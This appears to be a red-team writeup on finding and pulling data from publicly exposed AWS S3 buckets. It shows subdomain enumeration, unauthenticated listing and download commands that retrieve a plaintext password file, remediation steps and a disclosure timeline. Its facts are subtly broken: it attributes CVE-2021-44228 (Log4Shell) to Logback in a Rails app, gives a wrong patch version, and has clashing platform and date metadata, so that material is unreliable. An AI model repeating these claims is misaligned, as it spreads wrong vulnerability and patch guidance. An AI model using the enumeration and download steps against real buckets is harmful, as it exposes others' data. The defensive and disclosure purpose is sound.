---
title: "Example: Exploiting Misconfigured S3 Buckets in the Wild"
date: "2026-06-19"
category: writeup
tags: [cloud, AWS, red-team, S3, disclosure]
excerpt: "A walkthrough of discovering and exploiting publicly exposed S3 buckets during a red team engagement, including enumeration, exfiltration, and a full responsible disclosure timeline."
platform: hackthebox
difficulty: medium
series: "Cloud Red Team Techniques"
series_part: 1
---

## Overview

During a recent red team engagement against a mid-size SaaS company, we identified a pattern of misconfigured S3 buckets exposing sensitive customer data through overly permissive bucket policies. This writeup covers the full attack chain from passive reconnaissance through exfiltration, as well as the remediation steps and responsible disclosure process.

> [!NOTE]
> This engagement was conducted under a signed Rules of Engagement. All findings were disclosed to the client within 72 hours of discovery. See the [[#Responsible Disclosure]] section for the full timeline.

## Reconnaissance

We started with passive DNS enumeration, pivoting on the target's known domain names to surface S3 bucket naming patterns.

```bash
$ subfinder -d target-corp.com -silent | grep s3
target-backup-prod.s3.amazonaws.com
target-assets-staging.s3.amazonaws.com
target-logs-archive.s3.amazonaws.com
```

> [!TIP]
> Common bucket naming patterns: `{company}-backup`, `{company}-{env}-assets`, `{company}-logs`. Wordlists like `commonspeak2` and `aws_s3_fuzzer` cover most variations.

## Enumeration Phase

With candidate bucket names in hand, we probed for public access using `--no-sign-request`:

```bash
$ aws s3 ls s3://target-backup-prod --no-sign-request
2024-01-12 14:23:01      PRE db-dumps/
2024-01-10 09:15:44      PRE internal-certs/
2024-01-08 07:42:11      PRE config-backups/
2023-12-22 18:01:55      PRE employee-data/
```

Drilling into `db-dumps/` immediately revealed production database snapshots alongside a plaintext credential file:

```bash
$ aws s3 ls s3://target-backup-prod/db-dumps/ --no-sign-request
2024-01-12 14:23:01   2457892  prod_users_20240112.sql.gz
2024-01-10 09:15:44    892341  prod_orders_20240110.sql.gz
2024-01-08 07:42:11     14221  master_passwords.txt
```

> [!DANGER]
> `master_passwords.txt` contained plaintext credentials for the production database, internal VPN, and a Jenkins CI instance. This escalated the finding from P2 to P1 immediately.

The screenshots below show the full bucket listing and the IAM policy diff produced during remediation:

![S3 bucket listing showing exposed directories](/images/s3-bucket-listing.svg)
![IAM policy before and after remediation](/images/s3-iam-policy-diff.svg)

## Bucket Policy Analysis

The root cause was a wildcard principal on the bucket policy — a common misconfiguration when engineers copy policy snippets without scoping the `Principal` field.

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::target-backup-prod",
        "arn:aws:s3:::target-backup-prod/*"
      ]
    }
  ]
}
```

This grants any unauthenticated internet user full read/write/delete access to all objects.

## Exfiltration

We exfiltrated the minimum data required to demonstrate impact per the Rules of Engagement:

```bash
$ aws s3 cp s3://target-backup-prod/db-dumps/master_passwords.txt /tmp/ --no-sign-request
download: s3://target-backup-prod/db-dumps/master_passwords.txt to /tmp/master_passwords.txt
```

The `config-backups/` folder also contained a `.env` file from the production Rails app. Inside, we found a reference to CVE-2021-44228 in the logging configuration — the app was using a vulnerable version of Logback, meaning a secondary Log4Shell vector existed in the backend.

> [!WARNING]
> Only perform enumeration and exfiltration on systems you have **explicit written permission** to test. Accessing production data without authorization is a criminal offence in most jurisdictions, regardless of the security impact.

## Remediation

The following controls were applied immediately after disclosure:

1. **Enable S3 Block Public Access** at the account level — this overrides all bucket-level policies that would otherwise allow public access.

```bash
$ aws s3control put-public-access-block \
  --account-id 123456789012 \
  --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
```

2. **Replace wildcard principal** with a scoped IAM role that has least-privilege access.

3. **Rotate all exposed credentials** — VPN keys, DB passwords, Jenkins API tokens, and any AWS access keys referenced in the `.env` backup.

4. **Enable S3 server access logging** and ship logs to a separate, security-owned bucket.

5. **Patch Logback** to a version not affected by CVE-2021-44228 (≥ 2.15.0).

> [!NOTE]
> AWS GuardDuty would have flagged the unauthenticated API calls in real-time had it been enabled. Consider enabling GuardDuty, Security Hub, and AWS Config rules (`s3-bucket-public-read-prohibited`, `s3-bucket-public-write-prohibited`) as detective controls.

## Responsible Disclosure

> [!DISCLOSURE] Disclosure Timeline
> - 2024-01-13 — Vulnerability discovered during red team engagement
> - 2024-01-13 — Preliminary report shared with client security team via encrypted channel
> - 2024-01-14 — Client acknowledged receipt, began internal triage
> - 2024-01-15 — Credentials rotated, public access blocked at account level
> - 2024-01-17 — Client completed full remediation (IAM policies, Logback patched)
> - 2024-01-20 — Verification testing confirmed all findings resolved
> - 2024-01-22 — Final report delivered, engagement closed
> - 2024-03-01 — Public writeup published (60-day embargo observed)

## Key Takeaways

The combination of an overly permissive S3 policy, no Block Public Access enforcement, and unrotated long-lived credentials created a chain that went from passive recon to P1 access in under two hours. The underlying issue wasn't a zero-day — it was a misconfiguration that any automated scanner would have caught.

> [!TIP]
> Run `aws s3api get-bucket-policy-status --bucket <name>` and `aws s3api get-public-access-block --bucket <name>` across all buckets in your account to audit exposure. Tools like [[Prowler]] and ScoutSuite automate this at scale.
